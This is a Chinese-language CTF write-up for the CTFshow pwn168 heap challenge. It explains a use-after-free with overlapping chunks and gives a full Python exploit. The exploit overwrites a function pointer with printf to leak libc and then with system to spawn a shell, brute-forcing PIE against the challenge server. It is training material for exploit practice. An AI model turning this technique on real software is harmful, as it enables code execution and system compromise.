---
title: CTFshow pwn168
tags:
    - pwn
    - UAF
categories:
    - 做题笔记
cover: /img/紫发.png
---
# CTFshow pwn168(UAF|重叠)

## 前言
​	差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。
​	可谓是**“狸猫换太子”+“借尸还魂”**

## ida分析
### creat函数分析
![image-20250610224944662](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png)
1.首先会自动申请一个0x20的堆块，设为ptr1
2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存
3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数
4.ptr1+4 存放这数据长度
5.同时在bss段上的heaplist存放ptr1。
6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先"\x00"截断的情况。

### delete函数分析
![image-20250610225808351](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png)
![image-20250610230022127](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png)
![image-20250610230034623](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png)

1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数
2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞

## 思路分析
1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。
2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为"/bin/sh;"就可以打通。但再此之前我们要泄露出libc。
3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。
4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。
5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。
6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用"/bin/sh\x00"，因为会0字符截断，导致后续的system地址写不上去。
## exp
```python 
from esy import *
context.log_level="debug"
context.terminal=['tmux','splitw','-h','-l','66%']

# libc=ELF("/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")

def create(size,content):
    io.recvuntil("3.quit\n")
    io.send("create ")
    io.sendlineafter("Pls give string size:",str(size))
    io.sendafter("str:",content)

def delete(idx):
    io.recvuntil("3.quit\n")
    io.send("delete ")
    io.sendlineafter("id:",str(idx))
    io.sendlineafter("Are you sure?:","yes")

def exploit():
    create(0x10,b'\x61'*0x10) # 0 
    create(0x10,b'\x62'*0x10) # 1
    delete(1) 
    delete(0)

    create(0x20,b'%22$p'.ljust(0x18,b'b') + p16(0x08C0)) # 0 1是content

    delete(1)
    stdout=int(io.recv(14),16)
    libc=LibcSearcher("_IO_2_1_stdout_",stdout)
    libcbase=stdout-libc.dump("_IO_2_1_stdout_")
    system=libcbase+libc.dump("system")
    # libcbase=stdout-libc.sym["_IO_2_1_stdout_"]
    # system=libcbase+libc.sym["system"]
    logvalue("system",hex(system))
    logvalue("libc",hex(libcbase))

    create(0x10,b'\x61'*0x9+b'\x00')   # 1
    create(0x10,b'\x62'*0x9+b'\x00')   # 2
    delete(2)  
    delete(1)
    create(0x20,b'/bin/sh;'.ljust(0x18,b'\x63') + p64(system)) # 1 2是content
    #gdb.attach(io)
    delete(2)

i=0
while True:
    try:
        io,elf=loadfile("pwn","pwn.challenge.ctf.show",28247)
        exploit()
        io.interactive()
    except:
        io.close()
        print(i)
        i+=1
    
```